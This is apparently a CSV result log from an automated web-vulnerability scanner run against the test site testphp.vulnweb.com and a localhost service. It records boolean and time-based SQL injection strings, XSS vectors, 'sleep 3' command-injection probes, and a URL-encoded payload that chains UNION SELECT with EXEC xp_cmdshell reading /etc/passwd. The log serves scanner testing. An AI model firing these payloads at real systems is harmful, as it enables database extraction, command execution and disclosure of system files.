2026-01-22T16:03:15.486525,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.6246185302734375,0.6615281105041504,0.03690958023071289,0.059091394894344694,1343,200,,,generic
2026-01-22T16:03:36.231919,http://testphp.vulnweb.com/redir.php?r=http://mist-cccp.com/users.php?m=details&id=24157,r,boolean, AND 1=1,12.752326011657715,2.0631630420684814,-10.689162969589233,-0.8382128060259428,1816,403,,,generic
2026-01-22T16:03:43.020569,http://testphp.vulnweb.com/redir.php?r=http://mist-cccp.com/users.php?m=details&id=24157,r,boolean,' OR '1'='1'--,12.752326011657715,5.098371744155884,-7.653954267501831,-0.600200642651769,1816,403,,,generic
2026-01-22T16:03:44.909392,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,boolean, AND 1=1,0.5555546283721924,0.6970584392547607,0.14150381088256836,0.25470728467726533,323,200,,,generic
2026-01-22T16:03:47.523688,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,boolean, AND 1=1--,0.5555546283721924,0.6032567024230957,0.04770207405090332,0.08586387659243015,323,200,,,generic
2026-02-14T08:02:14.598595,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.0334439277648926,0.3736999034881592,-0.6597440242767334,-0.6383936337055187,1343,200,,,generic
2026-02-14T08:02:15.150003,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.1253001689910889,0.6948857307434082,-0.43041443824768066,-0.3824885573718323,1343,200,,,generic
2026-02-14T08:02:15.285830,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.1072134971618652,0.7146058082580566,-0.3926076889038086,-0.3545907721592854,1343,200,,,generic
2026-02-14T08:02:16.976506,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.0334439277648926,0.4194371700286865,-0.614006757736206,-0.5941364995623565,1343,200,,,generic
2026-02-14T08:02:17.553313,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.1253001689910889,0.6633987426757812,-0.4619014263153076,-0.4104695254151031,1343,200,,,generic
2026-02-14T08:02:17.594334,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.1072134971618652,0.7053799629211426,-0.40183353424072266,-0.3629232621086609,1343,200,,,generic
2026-02-14T08:02:21.550114,http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&mjqN=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,id,boolean,""" OR 1=1--",1.013970136642456,0.49115538597106934,-0.5228147506713867,-0.5156115863555659,319,200,,,generic
2026-02-14T08:02:48.354607,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.60076904296875,0.49109935760498047,-0.10966968536376953,-0.18254882911713907,1343,200,,,generic
2026-02-14T08:02:48.860159,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.6255450248718262,0.6005370616912842,-0.025007963180541992,-0.039977878787647796,1343,200,,,generic
2026-02-14T08:02:49.030455,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.6015381813049316,0.4702298641204834,-0.13130831718444824,-0.21828758550221677,1343,200,,,generic
2026-02-14T08:02:50.707180,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.60076904296875,0.6765830516815186,0.07581400871276855,0.12619493231230317,1343,200,,,generic
2026-02-14T08:02:51.302928,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.6255450248718262,0.4705977439880371,-0.15494728088378906,-0.24769964546602807,1343,200,,,generic
2026-02-14T08:02:51.328299,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.6015381813049316,0.6153781414031982,0.013839960098266602,0.02300761701982613,1343,200,,,generic
2026-02-14T08:03:02.100056,http://testphp.vulnweb.com/index.php?%25id%25=1&user=2&NuVD=7521%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,NuVD,boolean,' OR 'a'='a'--,0.6894314289093018,0.6497781276702881,-0.03965330123901367,-0.0575159465847767,4958,200,,,generic
2026-02-14T08:03:02.100923,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,fYij,boolean,' OR '1'='1'--,0.5353960990905762,0.8150277137756348,0.2796316146850586,0.5222892269107692,1343,200,,,generic
2026-02-14T08:03:02.115104,http://testphp.vulnweb.com/login.php?id=1&NtFH=4809%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean,') OR '1'='1,0.821399450302124,0.7081029415130615,-0.1132965087890625,-0.1379310745184821,5523,200,,,auth
2026-02-14T08:03:03.486940,http://testphp.vulnweb.com/login.php?id=1&NtFH=4809%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean,') OR 1=1--,0.821399450302124,0.6604759693145752,-0.16092348098754883,-0.19591379191738997,170,200,,,auth
2026-02-14T08:03:03.523274,http://testphp.vulnweb.com/index.php?%25id%25=1&user=2&NuVD=7521%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,NuVD,boolean,' OR 1=1--,0.6894314289093018,0.673877477645874,-0.015553951263427734,-0.022560548607472804,170,200,,,generic
2026-02-14T08:03:03.557732,http://testphp.vulnweb.com/?%3Fid=1&uHiF=6004%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,?id,boolean, AND 1=1,0.6118502616882324,0.7604830265045166,0.14863276481628418,0.24292343098158195,170,200,,,generic
2026-02-14T08:03:03.565475,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,fYij,boolean, AND 1=1--,0.5353960990905762,0.7188100814819336,0.18341398239135742,0.34257623972775375,170,200,,,generic
2026-02-14T08:03:04.146346,http://testphp.vulnweb.com/index.php?id=%252%25&user=1&gqAL=9173%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,gqAL,boolean,' OR 1=1/*,0.418820858001709,0.8406891822814941,0.42186832427978516,1.0072763001647442,170,200,,,generic
2026-02-14T08:03:21.081391,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,boolean, AND 1=1,0.24230718612670898,0.4019033908843994,0.15959620475769043,0.6586523796873002,323,200,,,generic
2026-02-14T08:03:23.284502,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,boolean, AND 1=1--,0.24230718612670898,0.4522416591644287,0.20993447303771973,0.866398047839734,323,200,,,generic
2026-02-14T08:03:37.283373,http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/3/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,id,boolean, AND 1=1,0.6103706359863281,0.7313063144683838,0.12093567848205566,0.19813482391175274,210,200,,,generic
2026-02-14T08:03:37.820156,http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-%27&gt=,id,boolean,' OR '1'='1'--,0.5718328952789307,0.5485525131225586,-0.02328038215637207,-0.040711862413959736,100,200,,,generic
2026-02-14T08:03:40.022632,http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-%27&gt=,id,boolean,' OR 'a'='a'--,0.5718328952789307,0.5815579891204834,0.009725093841552734,0.017006880719600773,100,200,,,generic
2026-02-14T08:03:42.499860,http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/3L/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,id,boolean, AND 1=1,0.7985868453979492,0.5190479755401611,-0.2795388698577881,-0.35004191650375754,210,200,,,generic
2026-02-14T08:03:42.928873,http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/3L/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,id,boolean, AND 1=1,0.3644273281097412,0.633425235748291,0.2689979076385498,0.7381386819529231,210,200,,,generic
2026-02-14T08:03:46.530248,http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/3/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,id,boolean,') OR '1'='1,0.6103706359863281,0.7238104343414307,0.11343979835510254,0.18585395768882224,214,200,,,generic
2026-02-14T08:03:48.925886,http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/Connection:/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,id,boolean, AND 1=1,0.4725210666656494,0.6885085105895996,0.2159874439239502,0.45709590357117447,210,200,,,generic
2026-02-14T08:03:50.059463,http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,id,boolean, AND 1=1,0.679201602935791,0.5610342025756836,-0.11816740036010742,-0.1739798608385771,210,200,,,generic
2026-02-14T08:03:51.753188,http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/3L/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,id,boolean,') OR '1'='1,0.7985868453979492,0.5885844230651855,-0.21000242233276367,-0.26296754516174875,214,200,,,generic
2026-02-14T08:03:52.325637,http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/3L/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,id,boolean,') OR '1'='1,0.3644273281097412,0.7301774024963379,0.3657500743865967,1.0036296572041303,214,200,,,generic
2026-02-14T08:03:57.930445,http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/Connection:/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,id,boolean,') OR '1'='1,0.4725210666656494,0.6277828216552734,0.15526175498962402,0.32858165686713287,214,200,,,generic
2026-02-14T08:03:59.059191,http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,id,boolean,') OR '1'='1,0.679201602935791,0.40758395195007324,-0.2716176509857178,-0.39990725848065384,214,200,,,generic
2026-02-14T08:04:03.699237,http://testphp.vulnweb.com/?%3Fid=%28SELECT%20%28CASE%20WHEN%20%281528%3D9439%29%20THEN%201%20ELSE%20%28SELECT%209439%20UNION%20SELECT%202819%29%20END%29%29,?id,boolean,' OR 1=1/*,0.6289205551147461,0.6373276710510254,0.008407115936279297,0.013367532461624544,170,200,,,generic
2026-03-08T06:36:07.443660,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.4093935489654541,5.5696001052856445,5.16020655632019,12.604513601545843,239,400,,,search
2026-03-08T06:57:33.041283,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.5666065216064453,5.504063129425049,4.9374566078186035,8.714083618063388,240,400,,,search
2026-03-08T07:05:42.428270,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.023153940836589,5.023153940836589,,112,200,4.766600843682126,,generic
2026-03-08T07:05:43.416781,http://127.0.0.1:8000/process?cmd=ls,cmd,command_injection,sleep 3,0,5.035560925801595,5.035560925801595,,117,200,4.571614342595067,,generic
2026-03-08T07:05:43.976091,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.051990270614624,5.051990270614624,,143,200,4.874412039673898,,generic
2026-03-08T07:30:25.719982,http://target.com,test_param,,,,,,,,200,,,
2026-03-08T07:31:39.470450,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.023301919301351,5.023301919301351,,112,200,4.766600843682126,,generic
2026-03-08T07:31:58.672901,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.024864276250203,5.024864276250203,,112,200,4.766600843682126,,generic
2026-03-08T07:32:26.833131,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.021851857503255,5.021851857503255,,112,200,4.766600843682126,,generic
2026-03-08T07:32:50.141643,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.02630877494812,5.02630877494812,,112,200,4.766600843682126,,generic
2026-03-08T07:34:42.691922,http://target.com/api,data,,,,,,,,200,,,
2026-03-08T07:34:42.711144,http://target.com/api,xml_body,,,,,,,,200,,,
2026-03-08T07:34:45.722781,invalid_url,xml_body,,,,,,,,200,,,
2026-03-08T07:35:02.612268,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.023383140563965,5.023383140563965,,112,200,4.766600843682126,,generic
2026-03-08T07:35:41.366056,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.014623800913493,5.014623800913493,,112,200,4.766600843682126,,generic
2026-03-08T07:36:16.816485,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.032693545023601,5.032693545023601,,112,200,4.766600843682126,,generic
2026-03-08T07:37:37.932112,http://target.com,test_param,,,,,,,,200,,,
2026-03-08T07:38:31.641206,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.006464958190918,5.006464958190918,,143,200,4.874412039673898,,generic
2026-03-08T07:38:51.261177,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.012896140416463,5.012896140416463,,143,200,4.874412039673898,,generic
2026-03-08T07:39:19.215019,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.02382755279541,5.02382755279541,,143,200,4.874412039673898,,generic
2026-03-08T07:39:42.180096,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.015396515528361,5.015396515528361,,143,200,4.874412039673898,,generic
2026-03-08T07:41:55.140526,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.006414572397868,5.006414572397868,,143,200,4.874412039673898,,generic
2026-03-08T07:42:34.136437,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.018474737803142,5.018474737803142,,143,200,4.874412039673898,,generic
2026-03-08T07:43:09.951534,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.014971892038981,5.014971892038981,,143,200,4.874412039673898,,generic
2026-03-08T07:45:24.678726,http://127.0.0.1:8000/process?cmd=ls,cmd,command_injection,sleep 3,0,5.016442219416301,5.016442219416301,,117,200,4.571614342595067,,generic
2026-03-08T07:45:24.756847,http://target.com,test_param,,,,,,,,200,,,
2026-03-08T07:45:44.356553,http://127.0.0.1:8000/process?cmd=ls,cmd,command_injection,sleep 3,0,5.0218385855356855,5.0218385855356855,,117,200,4.571614342595067,,generic
2026-03-08T07:45:44.443409,http://target.com,test_param,,,,,,,,200,,,
2026-03-08T07:46:12.124484,http://127.0.0.1:8000/process?cmd=ls,cmd,command_injection,sleep 3,0,5.01988156636556,5.01988156636556,,117,200,4.571614342595067,,generic
2026-03-08T07:46:12.226322,http://target.com,test_param,,,,,,,,200,,,
2026-03-08T07:46:34.990111,http://127.0.0.1:8000/process?cmd=ls,cmd,command_injection,sleep 3,0,5.025402863820394,5.025402863820394,,117,200,4.571614342595067,,generic
2026-03-08T07:46:35.107296,http://target.com,test_param,,,,,,,,200,,,
2026-03-08T07:47:59.952356,http://target.com/api,data,,,,,,,,200,,,
2026-03-08T07:47:59.974844,http://target.com/api,xml_body,,,,,,,,200,,,
2026-03-08T07:48:02.660811,http://target.com/api,data,,,,,,,,200,,,
2026-03-08T07:48:02.702014,http://target.com/api,xml_body,,,,,,,,200,,,
2026-03-08T07:48:02.913454,invalid_url,xml_body,,,,,,,,200,,,
2026-03-08T07:48:05.441824,invalid_url,xml_body,,,,,,,,200,,,
2026-03-08T07:48:09.831128,http://target.com/api,data,,,,,,,,200,,,
2026-03-08T07:48:09.870066,http://target.com/api,xml_body,,,,,,,,200,,,
2026-03-08T07:48:12.929001,invalid_url,xml_body,,,,,,,,200,,,
2026-03-08T07:48:15.279448,http://target.com/api,data,,,,,,,,200,,,
2026-03-08T07:48:15.300448,http://target.com/api,xml_body,,,,,,,,200,,,
2026-03-08T07:48:18.314335,invalid_url,xml_body,,,,,,,,200,,,
2026-03-08T07:48:47.865306,http://127.0.0.1:8000/process?cmd=ls,cmd,command_injection,sleep 3,0,5.027917544047038,5.027917544047038,,117,200,4.571614342595067,,generic
2026-03-08T07:49:02.193172,http://target.com,test_param,,,,,,,,200,,,
2026-03-08T07:49:06.584642,http://target.com/api,data,,,,,,,,200,,,
2026-03-08T07:49:06.635705,http://target.com/api,xml_body,,,,,,,,200,,,
2026-03-08T07:49:09.717969,invalid_url,xml_body,,,,,,,,200,,,
2026-03-08T07:49:26.593240,http://127.0.0.1:8000/process?cmd=ls,cmd,command_injection,sleep 3,0,5.0146879355112715,5.0146879355112715,,117,200,4.571614342595067,,generic
2026-03-08T07:50:02.368763,http://127.0.0.1:8000/process?cmd=ls,cmd,command_injection,sleep 3,0,5.029057900110881,5.029057900110881,,117,200,4.571614342595067,,generic
2026-03-08T07:50:16.347802,http://target.com,test_param,,,,,,,,200,,,
2026-03-08T07:50:20.769917,http://target.com/api,data,,,,,,,,200,,,
2026-03-08T07:50:20.815664,http://target.com/api,xml_body,,,,,,,,200,,,
2026-03-08T07:50:23.766268,invalid_url,xml_body,,,,,,,,200,,,
2026-03-08T07:52:16.639784,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.008631149927775,5.008631149927775,,112,200,4.766600843682126,,generic
2026-03-08T07:54:36.507206,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.012344837188721,5.012344837188721,,112,200,4.766600843682126,,generic
2026-03-08T08:05:30.636425,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.014588117599487,5.014588117599487,,112,200,4.766600843682126,,generic
2026-03-08T08:09:16.739418,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.020624399185181,5.020624399185181,,143,200,4.874412039673898,,generic
2026-03-08T08:11:38.070927,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.028589725494385,5.028589725494385,,146,200,4.876820996931252,,generic
2026-03-08T08:12:23.367090,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.01145871480306,5.01145871480306,,143,200,4.874412039673898,,generic
2026-03-08T08:16:10.097174,http://127.0.0.1:8000/process?cmd=ls,cmd,command_injection,sleep 3,0,5.022376298904419,5.022376298904419,,117,200,4.571614342595067,,generic
2026-03-08T08:18:31.015810,http://127.0.0.1:8000/process?cmd=ls,cmd,command_injection,sleep 3,0,5.029151678085327,5.029151678085327,,117,200,4.571614342595067,,generic
2026-03-08T08:19:16.369744,http://127.0.0.1:8000/process?cmd=ls,cmd,command_injection,sleep 3,0,5.038064797719319,5.038064797719319,,117,200,4.571614342595067,,generic
2026-03-08T08:19:16.454331,http://target.com,test_param,,,,,,,,200,,,
2026-03-08T08:23:14.856878,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.02787987391154,5.02787987391154,,112,200,4.766600843682126,,generic
2026-03-08T08:23:57.553548,http://target.com/api,data,,,,,,,,200,,,
2026-03-08T08:23:57.567618,http://target.com/api,xml_body,,,,,,,,200,,,
2026-03-08T08:24:00.557663,invalid_url,xml_body,,,,,,,,200,,,
2026-03-08T08:30:07.997464,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.008018334706624,5.008018334706624,,143,200,4.874412039673898,,generic
